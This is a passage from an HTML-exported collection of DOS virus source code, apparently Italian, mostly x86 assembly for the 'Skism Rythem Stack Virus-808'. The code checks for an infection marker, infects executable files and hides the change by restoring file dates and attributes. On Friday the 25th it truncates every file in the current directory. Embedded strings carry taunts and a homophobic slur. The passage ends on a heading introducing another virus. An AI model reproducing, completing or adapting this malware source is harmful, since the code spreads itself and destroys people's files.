yes">                     </span>;ERROR - FIND ANOTHER FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>HANDLE,AX<span style="mso-spacerun:
yes">                 </span>;SAVE HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3FH<span style="mso-spacerun:
yes">                    </span>;READ FROM FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX,HANDLE<span style="mso-spacerun:
yes">  </span><span style="mso-spacerun: yes">               </span>;MOVE
HANDLE TO BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>CX,02H<span style="mso-spacerun:
yes">                    </span>;READ 2 BYTES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET IDBUFFER<span
style="mso-spacerun: yes">        </span>;SAVE TO BUFFER<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3EH<span style="mso-spacerun:
yes">                    </span>;CLOSE FILE FOR NOW<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX,HANDLE<span style="mso-spacerun:
yes">                 </span>;LOAD BX WITH HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX, IDBUFFER<span style="mso-spacerun:
yes">              </span>;FILL BX WITH ID STRING<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>BX,02EBH<span style="mso-spacerun:
yes">                  </span>;INFECTED?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JNE<span
style="mso-spacerun: yes">     </span>DOIT<span style="mso-spacerun:
yes">                      </span>;SAME - FIND ANOTHER FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>FIXUP:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,1AH<span style="mso-spacerun:
yes">                    </span>;SET DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DS,[TEMPSEG]<span style="mso-spacerun:
yes">              </span>;RESTORE OLD SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,[TEMPOFS]<span style="mso-spacerun:
yes">              </span>;RESTORE OLD OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JMP<span
style="mso-spacerun: yes">     </span>NEXTEXE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DOIT:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX, OFFSET FILEDATA + FILENAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,3D02H<span style="mso-spacerun:
yes">                  </span>;OPEN FILE READ/WRITE ACCESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>HANDLE,AX<span style="mso-spacerun:
yes">                 </span>;SAVE HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CALL<span
style="mso-spacerun: yes">    </span>INFECTFILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;MOV<span
style="mso-spacerun: yes">     </span>AX,3EH<span style="mso-spacerun:
yes">                    </span>;CLOSE FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;INT<span
style="mso-spacerun: yes">     </span>21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ROLLOUT:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,5701H<span style="mso-spacerun:
yes">                  </span>;RESTORE ORIGINAL<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX,HANDLE<span style="mso-spacerun:
yes">                 </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>CX,ORIG_TIME<span style="mso-spacerun:
yes">              </span>;TIME AND<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,ORIG_DATE<span style="mso-spacerun:
yes">              </span>;DATE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,4301H<span style="mso-spacerun:
yes">                  </span>;RESTORE ORIGINAL ATTRIBUTES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>CX,ORIG_ATTR<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET FILEDATA + FILENAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;MOV<span
style="mso-spacerun: yes">     </span>BX,HANDLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;MOV<span
style="mso-spacerun: yes">     </span>AX,3EH<span style="mso-spacerun:
yes">             </span><span style="mso-spacerun: yes">      </span>;CLOSE
FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;INT<span
style="mso-spacerun: yes">     </span>21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3BH<span style="mso-spacerun:
yes">                    </span>;TRY TO FIX THIS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET ROOTDIR<span
style="mso-spacerun: yes">         </span>;FOR SPEED<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3BH<span style="mso-spacerun:
yes">                    </span>;CHANGE DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET CURRENTDIR<span
style="mso-spacerun: yes">      </span>;BACK TO ORIGINAL<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,2AH<span style="mso-spacerun:
yes">                    </span>;CHECK SYSTEM DATE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>CX,1991<span style="mso-spacerun:
yes">                   </span>;IS IT AT LEAST 1991?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>JB<span style="mso-spacerun:
yes">    </span><span style="mso-spacerun: yes">  </span>AUDI<span
style="mso-spacerun: yes">                      </span>;NO? </span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>DON'T
DO IT NOW<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>DL,25<span style="mso-spacerun:
yes">                     </span>;IS IT THE 25TH?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JB<span
style="mso-spacerun: yes">      </span>AUDI<span style="mso-spacerun:
yes">                      </span>;NOT YET? QUIT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>AL,5<span style="mso-spacerun:
yes">                      </span>;IS fRIDAY?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>JNE<span style="mso-spacerun:
yes">     </span>AUDI<span style="mso-spacerun: yes">                     
</span>;NO? </span></b><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>QUIT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET DIRDATA<span
style="mso-spacerun: yes">         </span>;OFFSET OF WHERE TO HOLD NEW DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,1AH<span style="mso-spacerun:
yes">                    </span>;SET DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4EH<span style="mso-spacerun:
yes">                    </span>;FIND FIRST FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>CX,7H<span style="mso-spacerun:
yes">          </span><span style="mso-spacerun: yes">           </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET FILESPEC2<span
style="mso-spacerun: yes">       </span>;OFFSET *.*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lOOPS:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JC<span
style="mso-spacerun: yes">      </span>AUDI<span style="mso-spacerun:
yes">                      </span>;ERROR? THEN QUIT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,4301H<span style="mso-spacerun:
yes">                  </span>;FIND ALL NORMAL FILES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>XOR<span
style="mso-spacerun: yes">     </span>CX,CX<span style="mso-spacerun: yes">    
</span><span style="mso-spacerun: yes">                </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET DIRDATA + FILENAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3CH<span style="mso-spacerun:
yes">                    </span>;FUCK UP ALL FILES IN CURRENT DIR<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>INT<span style="mso-spacerun:
yes">     </span>21H<span style="mso-spacerun: yes">                      
</span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JC<span
style="mso-spacerun: yes">      </span>AUDI<span style="mso-spacerun:
yes">                      </span>;ERROR? QUIT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4FH<span style="mso-spacerun:
yes">                    </span>;FIND NEXT FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JMP<span
style="mso-spacerun: yes">     </span>LOOPS<span style="mso-spacerun:
yes">                     </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>AUDI:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,4C00H<span style="mso-spacerun:
yes">                  </span>;END PROGRAM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;tHE BELOW IS JUST TEXT TO PAD OUT THE VIRUS SIZE TO
808 BYTES.<span style="mso-spacerun: yes">  </span>dON'T<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;JUST CHANGE THE TEXT AND CLAIM THAT THIS IS YOUR
CREATION.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>WORDS_<span style="mso-spacerun: yes">  
</span>DB<span style="mso-spacerun: yes">   </span>&quot;sKISM rYTHEM sTACK
vIRUS-808. sMART kIDS iNTO sICK mETHODS&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>WORDS2<span style="mso-spacerun: yes">  
</span>DB<span style="mso-spacerun: yes">   </span>&quot;<span
style="mso-spacerun: yes">  </span>dONT ALTER THIS CODE INTO YOUR OWN STRAIN,
FAGGIT.<span style="mso-spacerun: yes">      </span>&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>WORDS3<span style="mso-spacerun: yes">  
</span>DB<span style="mso-spacerun: yes">   </span>&quot;<span
style="mso-spacerun: yes">  </span>hr/sss nycITY, THIS IS THE FIFTH OF MANY,
MANY MORE....&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>WORDS4<span style="mso-spacerun: yes">  
</span>DB<span style="mso-spacerun: yes">   </span>&quot;<span
style="mso-spacerun: yes">  </span>yOU SISSYS.....&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>MAIN<span style="mso-spacerun: yes">     </span>ENDP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>CODE<span style="mso-spacerun: yes">     </span>ENDS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">         </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>END<span
style="mso-spacerun: yes">      </span>MAIN<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:red;mso-ansi-language:EN-US'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_6._Virus_Enmity:"></a><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:red'>6. Virus Enmity:<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>contiene una curiosa routine di decrittazione.
